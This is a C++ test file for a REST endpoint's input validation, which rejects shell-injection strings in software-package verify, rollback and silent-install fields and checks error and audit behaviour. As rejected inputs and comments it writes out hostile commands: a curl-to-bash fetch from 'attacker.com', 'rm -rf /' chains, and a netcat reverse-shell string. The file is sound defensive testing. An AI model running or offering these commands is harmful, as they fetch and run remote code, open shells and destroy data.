/**
 * test_rest_software_packages.cpp — HTTP-level tests for the input-validation
 * guard added to `POST /api/v1/software-packages` per #771 / W7.5.
 *
 * The bug: `verify_command` and `rollback_command` on a SoftwarePackage were
 * persisted from REST input without any validation. Any operator with
 * `SoftwareDeployment:Write` could stage `"curl http://attacker.com/sh | bash"`
 * as a verify_command — fleet-RCE-class once the deployment-execution path is
 * wired up. PR 1 of the W7.5 ladder rejects shell metacharacters at REST
 * input time; PR 2 (filed as follow-up) will replace the free-form strings
 * with a structured action protocol.
 *
 * These tests cover:
 *   - Happy path: realistic msiexec / reg / wmic / dpkg / PowerShell commands
 *     pass validation and create the package.
 *   - Injection rejection: shell-chaining (`;`, `&`, `|`), substitution
 *     (`` ` ``, `$`), redirection (`<`, `>`), subshell (`(`, `)`), multi-line
 *     all return 400 with explicit error and a security-audit row.
 *   - Length cap (512 chars) — anything longer is rejected.
 *   - Rejection happens BEFORE the store sees the payload (no partial-state
 *     write).
 *
 * Fixture mirrors the in-process TestRouteSink pattern from
 * test_rest_api_tokens.cpp: no socket, no acceptor thread, no TSan risk.
 */

#include "audit_store.hpp"
#include "pg/pg_pool.hpp"
#include "pg/pg_raii.hpp"
#include "rest_api_v1.hpp"
#include "software_deployment_store.hpp"
#include "test_route_sink.hpp"

#include <yuzu/metrics.hpp>

#include <catch2/catch_test_macros.hpp>

#include <httplib.h>
#include <nlohmann/json.hpp>

#include "../test_helpers.hpp"

#include <algorithm>
#include <stdexcept>
#include <string>
#include <vector>

using namespace yuzu::server;

namespace {

// Pre-migrated template — shares the "swdeploystore" key with
// test_software_deployment_store.cpp's own template (identical setup,
// replay-verified per docs/postgres-store-playbook.md step 7).
yuzu::test::PgTestTemplate rest_sw_deploy_store_tpl{
    "swdeploystore", [](const std::string& dsn) {
        yuzu::server::pg::PgPool pool{{.conninfo = dsn, .size = 1}};
        SoftwareDeploymentStore store{pool};
        if (!store.is_open())
            throw std::runtime_error("software_deployment_store template: failed to migrate");
    }};

struct AuditRecord {
    std::string action;
    std::string result;
    std::string target_id;
    std::string detail;
};

struct SwPkgHarness {
    yuzu::server::test::TestRouteSink sink;

    // No earlier-constructed PG member to inherit a skip guard from — this
    // harness gives itself the explicit guard the playbook's test-file-
    // drift note requires (docs/postgres-store-playbook.md "Long-lived
    // migration branches..."): copying a SKIP-via-earlier-member shape onto
    // a fixture without one would silently turn "skip locally" into
    // "hard-fail locally". PgPool declared before the store so it
    // destructs AFTER it (member destruction order).
    std::optional<yuzu::test::PostgresTestDb> sw_deploy_db;
    std::optional<yuzu::server::pg::PgPool> sw_deploy_pool;
    std::unique_ptr<SoftwareDeploymentStore> sw_deploy_store;

    std::string session_user{"admin"};
    auth::Role session_role{auth::Role::admin};

    std::vector<AuditRecord> audit_log;
    bool audit_succeeds{true};

    yuzu::MetricsRegistry metrics;
    RestApiV1 api;

    SwPkgHarness() {
        if (yuzu::test::pg_admin_dsn_env() == nullptr) {
            SKIP("YUZU_TEST_POSTGRES_DSN not set - Postgres test skipped");
        }
        sw_deploy_db.emplace(rest_sw_deploy_store_tpl);
        INFO("[SwPkgHarness fixture] status (blank == came up OK): " << sw_deploy_db->error());
        REQUIRE(sw_deploy_db->available());
        sw_deploy_pool.emplace(
            yuzu::server::pg::PgPool::Options{.conninfo = sw_deploy_db->dsn(), .size = 4});
        REQUIRE(sw_deploy_pool->valid());
        sw_deploy_store = std::make_unique<SoftwareDeploymentStore>(*sw_deploy_pool);
        REQUIRE(sw_deploy_store->is_open());

        auto auth_fn = [this](const httplib::Request&,
                              httplib::Response&) -> std::optional<auth::Session> {
            if (session_user.empty())
                return std::nullopt;
            auth::Session s;
            s.username = session_user;
            s.role = session_role;
            return s;
        };
        auto perm_fn = [](const httplib::Request&, httplib::Response&, const std::string&,
                          const std::string&) -> bool {
            return true;
        };
        auto audit_fn = [this](const httplib::Request&, const std::string& action,
                               const std::string& result, const std::string&,
                               const std::string& target_id, const std::string& detail) -> bool {
            audit_log.push_back({action, result, target_id, detail});
            return audit_succeeds;
        };

        api.register_routes(sink, auth_fn, perm_fn, audit_fn,
                            /*rbac_store=*/nullptr,
                            /*mgmt_store=*/nullptr,
                            /*token_store=*/nullptr,
                            /*quarantine_store=*/nullptr,
                            /*response_store=*/nullptr,
                            /*instruction_store=*/nullptr,
                            /*execution_tracker=*/nullptr,
                            /*schedule_engine=*/nullptr,
                            /*approval_manager=*/nullptr,
                            /*tag_store=*/nullptr,
                            /*audit_store=*/nullptr,
                            /*service_group_fn=*/{},
                            /*tag_push_fn=*/{},
                            /*inventory_store=*/nullptr,
                            /*product_pack_store=*/nullptr, sw_deploy_store.get(),
                            /*device_token_store=*/nullptr,
                            /*license_store=*/nullptr,
                            /*guaranteed_state_store=*/nullptr,
                            /*metrics_registry=*/&metrics);
    }

    ~SwPkgHarness() = default;

    /// Build a JSON body for POST /api/v1/software-packages with arbitrary
    /// verify_command / rollback_command. Other fields use safe defaults.
    static std::string make_body(const std::string& verify_cmd,
                                 const std::string& rollback_cmd = "",
                                 const std::string& name = "Firefox") {
        std::string body = R"({"name":")" + name +
                           R"(","version":"125.0",)"
                           R"("platform":"windows","installer_type":"msi",)"
                           R"("verify_command":")";
        body += verify_cmd;
        body += R"(","rollback_command":")";
        body += rollback_cmd;
        body += R"("})";
        return body;
    }

    auto post(const std::string& body) { return sink.Post("/api/v1/software-packages", body); }
    auto get_packages() { return sink.Get("/api/v1/software-packages"); }
    auto post_deployment(const std::string& body) {
        return sink.Post("/api/v1/software-deployments", body);
    }
    auto get_deployments() { return sink.Get("/api/v1/software-deployments"); }
    auto post_start(const std::string& id) {
        return sink.Post("/api/v1/software-deployments/" + id + "/start", "");
    }
    auto post_rollback(const std::string& id) {
        return sink.Post("/api/v1/software-deployments/" + id + "/rollback", "");
    }
    auto post_cancel(const std::string& id) {
        return sink.Post("/api/v1/software-deployments/" + id + "/cancel", "");
    }
};

} // namespace

// ── Happy path: realistic install verification vocabulary ────────────────────

TEST_CASE("REST POST software-packages: msiexec verify_command accepted",
          "[rest][software_deployment][771][pg]") {
    SwPkgHarness h;
    // MSI product GUID — braces are intentionally NOT shell-metachars on the
    // agent side (we execvp / CreateProcessW, no shell), so they are allowed.
    auto res =
        h.post(SwPkgHarness::make_body("msiexec /x {12345678-1234-1234-1234-123456789ABC} /qn"));
    REQUIRE(res);
    CHECK(res->status == 201);
    REQUIRE(h.audit_log.size() == 1);
    CHECK(h.audit_log[0].action == "software_package.create");
    CHECK(h.audit_log[0].result == "success");
}

TEST_CASE("REST POST software-packages: reg-query verify_command accepted",
          "[rest][software_deployment][771][pg]") {
    SwPkgHarness h;
    auto res =
        h.post(SwPkgHarness::make_body(R"(reg query HKLM\\Software\\Mozilla)", "", "Firefox-reg"));
    REQUIRE(res);
    CHECK(res->status == 201);
}

TEST_CASE("REST POST software-packages: dpkg verify_command accepted",
          "[rest][software_deployment][771][pg]") {
    SwPkgHarness h;
    auto res = h.post(
        SwPkgHarness::make_body("dpkg -s firefox", "apt-get remove -y firefox", "Firefox-deb"));
    REQUIRE(res);
    CHECK(res->status == 201);
}

TEST_CASE("REST POST software-packages: empty verify+rollback accepted (optional fields)",
          "[rest][software_deployment][771][pg]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("", "", "Firefox-no-verify"));
    REQUIRE(res);
    CHECK(res->status == 201);
}

// ── Injection rejection: cluster-2 RCE attack vector ─────────────────────────

TEST_CASE("REST POST software-packages: pipe-to-shell verify_command rejected",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    // The exact PoC from #771's issue body.
    auto res = h.post(SwPkgHarness::make_body("curl http://attacker.com/shell.sh | bash"));
    REQUIRE(res);
    CHECK(res->status == 400);
    REQUIRE(h.audit_log.size() == 1);
    CHECK(h.audit_log[0].action == "software_package.create");
    CHECK(h.audit_log[0].result == "denied");
    CHECK(h.audit_log[0].detail.find("verify_command") != std::string::npos);
    // No package was persisted.
    auto pkgs = h.sw_deploy_store->list_packages();
    REQUIRE(pkgs.has_value());
    CHECK(pkgs->empty());
}

TEST_CASE("REST POST software-packages: injection via rollback_command rejected",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    // verify_command is benign; the injection is in rollback_command. The
    // rejection must surface that specific field by name in the audit detail
    // so an operator triaging an attempted injection sees which field was
    // weaponised.
    auto res =
        h.post(SwPkgHarness::make_body("dpkg -s firefox", "apt-get remove -y firefox; rm -rf /"));
    REQUIRE(res);
    CHECK(res->status == 400);
    REQUIRE(h.audit_log.size() == 1);
    CHECK(h.audit_log[0].action == "software_package.create");
    CHECK(h.audit_log[0].result == "denied");
    CHECK(h.audit_log[0].detail.find("rollback_command") != std::string::npos);
    auto pkgs = h.sw_deploy_store->list_packages();
    REQUIRE(pkgs.has_value());
    CHECK(pkgs->empty());
}

// Note on validator scope: this PR blocks INJECTION-VIA-SHELL-METACHARACTERS,
// not dangerous PROGRAMS by name. A string like `"nc -e /bin/sh attacker 4444"`
// will pass character validation because it contains no shell metachars — when
// execvp'd without a shell, netcat is invoked literally with those args
// (still dangerous, but a different attack class). Blocking that requires
// either an executable allowlist (brittle) or the structured-action protocol
// proposed for PR 2 of the W7.5 ladder, which replaces free-form strings with
// references to whitelisted InstructionDefinitions. Tracked separately.

TEST_CASE("REST POST software-packages: semicolon command chaining rejected",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("dpkg -s firefox; rm -rf /"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: backtick substitution rejected",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("echo `whoami`"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: dollar-paren substitution rejected",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("echo $(whoami)"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: stdout redirection rejected",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("dpkg -s firefox > /tmp/leak"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: && chaining rejected",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("ok && evil"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: oversize command rejected",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    std::string big(600, 'a'); // exceeds 512-char cap
    auto res = h.post(SwPkgHarness::make_body(big));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: exactly-at-cap command accepted",
          "[rest][software_deployment][771][pg]") {
    SwPkgHarness h;
    std::string at_cap(512, 'a');
    auto res = h.post(SwPkgHarness::make_body(at_cap, "", "ExactCap"));
    REQUIRE(res);
    CHECK(res->status == 201);
}

// ── Sibling-gap: silent_args validated identically (round 1 governance) ──────

TEST_CASE("REST POST software-packages: silent_args injection rejected",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    // Construct a body where verify+rollback are clean but silent_args carries
    // the injection. Without R1 hardening this passed validation.
    std::string body = R"({"name":"SiblingGap","version":"1.0",)"
                       R"("platform":"linux","installer_type":"deb",)"
                       R"("verify_command":"dpkg -s firefox","rollback_command":"",)"
                       R"("silent_args":"/qn ; rm -rf /"})";
    auto res = h.post(body);
    REQUIRE(res);
    CHECK(res->status == 400);
    REQUIRE(h.audit_log.size() == 1);
    CHECK(h.audit_log[0].result == "denied");
    CHECK(h.audit_log[0].detail.find("silent_args") != std::string::npos);
    auto pkgs = h.sw_deploy_store->list_packages();
    REQUIRE(pkgs.has_value());
    CHECK(pkgs->empty());
}

TEST_CASE("REST POST software-packages: silent_args /qn /norestart accepted",
          "[rest][software_deployment][771][pg]") {
    SwPkgHarness h;
    // Standard MSI silent install args — must pass the validator.
    std::string body = R"({"name":"SilentOK","version":"1.0",)"
                       R"("platform":"windows","installer_type":"msi",)"
                       R"("silent_args":"/qn /norestart"})";
    auto res = h.post(body);
    REQUIRE(res);
    CHECK(res->status == 201);
}

// ── C0 control characters (security MEDIUM-2): tab / VT / FF blocked ─────────

TEST_CASE("REST POST software-packages: tab character rejected",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    // Tab is a shell word-separator in bash/zsh — same risk class as space
    // with extra log-injection nastiness. Should be blocked alongside other
    // C0 controls.
    auto res = h.post(SwPkgHarness::make_body("dpkg\t-s firefox"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

// ── Bad JSON payload types (unhappy #1): 400 not 500 ─────────────────────────

TEST_CASE("REST POST software-packages: non-string verify_command returns 400 not 500",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    // body.value("verify_command", "") throws json::type_error on type
    // mismatch. Without the try/catch wrapper the exception escapes the
    // lambda → httplib 500 with no audit trail.
    std::string body = R"({"name":"BadType","version":"1.0","verify_command":42})";
    auto res = h.post(body);
    REQUIRE(res);
    CHECK(res->status == 400);
    REQUIRE(h.audit_log.size() == 1);
    CHECK(h.audit_log[0].result == "denied");
    CHECK(h.audit_log[0].detail.find("wrong JSON type") != std::string::npos);
}

TEST_CASE("REST POST software-packages: explicit null verify_command rejected as wrong type",
          "[rest][software_deployment][771][security][pg]") {
    SwPkgHarness h;
    // nlohmann::json::value(key, default) THROWS json::type_error when the
    // key is present-but-null (because std::string is not nullable). The
    // try/catch wrapper catches it and returns 400 with the
    // "wrong JSON type" audit detail. This is the deliberately stricter
    // posture: missing key → use default (accepted); explicit null →
    // rejected as a wrong-type signal. Pin the contract so an operator
    // client sending `null` knows the field requires an explicit string or
    // omission.
    std::string body = R"({"name":"NullField","version":"1.0",)"
                       R"("verify_command":null})";
    auto res = h.post(body);
    REQUIRE(res);
    CHECK(res->status == 400);
    REQUIRE(h.audit_log.size() == 1);
    CHECK(h.audit_log[0].result == "denied");
    CHECK(h.audit_log[0].detail.find("wrong JSON type") != std::string::npos);
}

TEST_CASE("REST POST software-packages: missing verify_command field defaults to empty",
          "[rest][software_deployment][771][pg]") {
    SwPkgHarness h;
    // Omitting the field entirely — the documented "no verify command"
    // posture. value(key, "") returns "" for absent keys; the validator
    // accepts empty strings.
    std::string body = R"({"name":"NoVerify","version":"1.0","platform":"linux"})";
    auto res = h.post(body);
    REQUIRE(res);
    CHECK(res->status == 201);
}

// gov review (Doomgoose, PR #3174, important): sw_deploy_error_status /
// sw_deploy_client_message (rest_api_v1.cpp) map a genuine store failure to
// 503 + a generic message, and a business/validation error to 400 + the
// message echoed verbatim -- but nothing exercised either branch through an
// actual route. A store-level test proving create_package() et al. return a
// kSwDeployDbErrorPrefix-tagged error on a genuine failure does not prove
// the ROUTE actually maps that to 503 without leaking the raw Postgres text.
//
// Technique matches test_rest_quarantine_routes.cpp's "REST routes answer
// 503... on a genuine store failure" precedent: DROP the store's own schema
// out from under an already-open store. `is_open()` is cached at
// construction and never re-verified, so the route's guard still passes and
// the next query fails live with a real libpq error.
TEST_CASE("REST software-deployment routes answer 503 (not 400) on a genuine store failure, "
          "never leaking the raw Postgres error",
          "[rest][software_deployment][pg]") {
    SwPkgHarness h;
    // Seed one package + deployment before dropping the schema, so the
    // lifecycle-action route (start) has a real id to target -- the
    // store-level FK/lookup logic is bypassed entirely once the schema is
    // gone (the query itself fails), so any pre-existing id would do, but a
    // genuinely-created one keeps the fixture honest.
    auto seeded_pkg = h.post(SwPkgHarness::make_body("dpkg -s firefox"));
    REQUIRE(seeded_pkg);
    REQUIRE(seeded_pkg->status == 201);
    auto pkg_id = nlohmann::json::parse(seeded_pkg->body)["data"]["id"].get<std::string>();

    auto seeded_dep =
        h.post_deployment(R"({"package_id":")" + pkg_id + R"(","scope_expression":"all"})");
    REQUIRE(seeded_dep);
    REQUIRE(seeded_dep->status == 201);
    auto dep_id = nlohmann::json::parse(seeded_dep->body)["data"]["id"].get<std::string>();

    h.audit_log.clear(); // isolate the failures under test from the seed calls' own audit rows

    {
        pg::PgConn conn{PQconnectdb(h.sw_deploy_db->dsn().c_str())};
        REQUIRE(PQstatus(conn.get()) == CONNECTION_OK);
        pg::PgResult r{PQexec(conn.get(), "DROP SCHEMA software_deployment_store CASCADE")};
        REQUIRE(r.ok());
    }

    SECTION("POST /api/v1/software-packages") {
        auto res = h.post(SwPkgHarness::make_body("dpkg -s other-package"));
        REQUIRE(res);
        CHECK(res->status == 503);
        CHECK(res->body.find("service unavailable") != std::string::npos);
        // The failure is a genuine libpq error (relation does not exist) --
        // confirm none of that text reached the client.
        CHECK(res->body.find("does not exist") == std::string::npos);
        CHECK(res->body.find("software_deployment_store") == std::string::npos);
        // No STORE-failure audit call on this route -- denial audits (the
        // emit_denial path above) fire only on a validation failure, and
        // this request's body passes validation, failing only at the store.
        REQUIRE(h.audit_log.empty());
        // gov-fix(consistency-auditor, Gate 4, b77952416..HEAD review round):
        // this test asserted status+message but never the A4 envelope's
        // other required fields -- matching test_rest_quarantine_routes.cpp's
        // precedent (added there after the identical gap was found on that
        // route). This route sets no explicit retry hint, so retry_after_ms
        // is the A4-required-but-null shape, not a concrete value.
        CHECK_FALSE(res->get_header_value("X-Correlation-Id").empty());
        CHECK(res->body.find(R"("retry_after_ms":null)") != std::string::npos);
    }
    SECTION("GET /api/v1/software-packages") {
        auto res = h.get_packages();
        REQUIRE(res);
        CHECK(res->status == 503);
        CHECK(res->body.find("does not exist") == std::string::npos);
    }
    SECTION("POST /api/v1/software-deployments") {
        auto res = h.post_deployment(R"({"package_id":")" + pkg_id + R"(","scope_expression":"all"})");
        REQUIRE(res);
        CHECK(res->status == 503);
        CHECK(res->body.find("service unavailable") != std::string::npos);
        CHECK(res->body.find("does not exist") == std::string::npos);
    }
    SECTION("GET /api/v1/software-deployments") {
        auto res = h.get_deployments();
        REQUIRE(res);
        CHECK(res->status == 503);
        CHECK(res->body.find("does not exist") == std::string::npos);
    }
    SECTION("POST /api/v1/software-deployments/{id}/start") {
        auto res = h.post_start(dep_id);
        REQUIRE(res);
        CHECK(res->status == 503);
        CHECK(res->body.find("service unavailable") != std::string::npos);
        CHECK(res->body.find("does not exist") == std::string::npos);
    }
}

// gov review (Doomgoose, PR #3174, minor): a fix landed in this same round
// (software_deployment.create now audits dep.package_id as its detail field,
// matching every sibling create-event's convention of naming what the row
// belongs to, instead of an empty string) with no regression test.
TEST_CASE("REST POST software-deployments: create audits dep.package_id as the detail field, "
          "not empty",
          "[rest][software_deployment][pg]") {
    SwPkgHarness h;
    auto pkg = h.post(SwPkgHarness::make_body("dpkg -s firefox"));
    REQUIRE(pkg);
    REQUIRE(pkg->status == 201);
    auto pkg_id = nlohmann::json::parse(pkg->body)["data"]["id"].get<std::string>();

    auto res =
        h.post_deployment(R"({"package_id":")" + pkg_id + R"(","scope_expression":"all"})");
    REQUIRE(res);
    REQUIRE(res->status == 201);

    auto create_call =
        std::find_if(h.audit_log.begin(), h.audit_log.end(),
                     [](const AuditRecord& a) { return a.action == "software_deployment.create"; });
    REQUIRE(create_call != h.audit_log.end());
    CHECK(create_call->result == "success");
    CHECK(create_call->detail == pkg_id);
}

// gov review (Doomgoose, PR #3174, important; re-checked at Gate 8 by
// security-guardian): the earlier 503-path test (above) only covers half of
// sw_deploy_error_status/sw_deploy_client_message's job -- a genuine store
// failure. The OTHER branch, a business/validation error returned by the
// store (never carrying kSwDeployDbErrorPrefix), must map to 400 with the
// message echoed verbatim, not masked like a genuine failure would be.
TEST_CASE("REST software-deployment routes answer 400 (not 503) on a business/validation "
          "error, echoing the message verbatim",
          "[rest][software_deployment][pg]") {
    SwPkgHarness h;

    SECTION("POST /api/v1/software-deployments: package_id does not exist") {
        auto res = h.post_deployment(R"({"package_id":"no-such-package","scope_expression":"all"})");
        REQUIRE(res);
        CHECK(res->status == 400);
        CHECK(res->body.find("package_id does not exist") != std::string::npos);
    }
    SECTION("POST /api/v1/software-deployments/{id}/start: deployment not found") {
        auto res = h.post_start("0000000000000000000000000000dead");
        REQUIRE(res);
        CHECK(res->status == 400);
        CHECK(res->body.find("deployment not found") != std::string::npos);
    }
}

// gov review (unhappy-path + compliance-officer, Gate 4/6, b77952416..HEAD
// review round): the audit-persistence discard fix (DG-2) shipped with no
// test proving Sec-Audit-Failed actually gets set when audit_fn returns
// false -- audit_succeeds was always true, so the header-set branch was
// dead code from the test suite's perspective. Matches the harness-toggle
// precedent in test_kek_routes.cpp / test_ca_routes.cpp. The mutation has
// already durably committed by the time audit_fn runs, so the correct
// posture is set-and-proceed (still 2xx), never fail-closed.
TEST_CASE("REST software-deployment/package routes set Sec-Audit-Failed on a dropped audit row, "
          "and still return success",
          "[rest][software_deployment][pg]") {
    SwPkgHarness h;

    SECTION("POST /api/v1/software-packages") {
        h.audit_succeeds = false;
        auto res = h.post(SwPkgHarness::make_body("dpkg -s firefox"));
        REQUIRE(res);
        CHECK(res->status == 201);
        CHECK(res->get_header_value("Sec-Audit-Failed") == "true");
    }
    SECTION("POST /api/v1/software-deployments, .../start, .../rollback, .../cancel") {
        auto pkg = h.post(SwPkgHarness::make_body("dpkg -s firefox"));
        REQUIRE(pkg);
        REQUIRE(pkg->status == 201);
        auto pkg_id = nlohmann::json::parse(pkg->body)["data"]["id"].get<std::string>();

        h.audit_succeeds = false;
        auto dep =
            h.post_deployment(R"({"package_id":")" + pkg_id + R"(","scope_expression":"all"})");
        REQUIRE(dep);
        REQUIRE(dep->status == 201);
        CHECK(dep->get_header_value("Sec-Audit-Failed") == "true");
        auto dep_id = nlohmann::json::parse(dep->body)["data"]["id"].get<std::string>();

        auto start = h.post_start(dep_id);
        REQUIRE(start);
        REQUIRE(start->status == 200);
        CHECK(start->get_header_value("Sec-Audit-Failed") == "true");

        auto rollback = h.post_rollback(dep_id);
        REQUIRE(rollback);
        REQUIRE(rollback->status == 200);
        CHECK(rollback->get_header_value("Sec-Audit-Failed") == "true");

        auto pkg2 = h.post(SwPkgHarness::make_body("dpkg -s firefox", "", "Firefox-2"));
        REQUIRE(pkg2);
        REQUIRE(pkg2->status == 201);
        auto pkg2_id = nlohmann::json::parse(pkg2->body)["data"]["id"].get<std::string>();
        auto dep2 =
            h.post_deployment(R"({"package_id":")" + pkg2_id + R"(","scope_expression":"all"})");
        REQUIRE(dep2);
        REQUIRE(dep2->status == 201);
        auto dep2_id = nlohmann::json::parse(dep2->body)["data"]["id"].get<std::string>();

        auto cancel = h.post_cancel(dep2_id);
        REQUIRE(cancel);
        REQUIRE(cancel->status == 200);
        CHECK(cancel->get_header_value("Sec-Audit-Failed") == "true");
    }
}
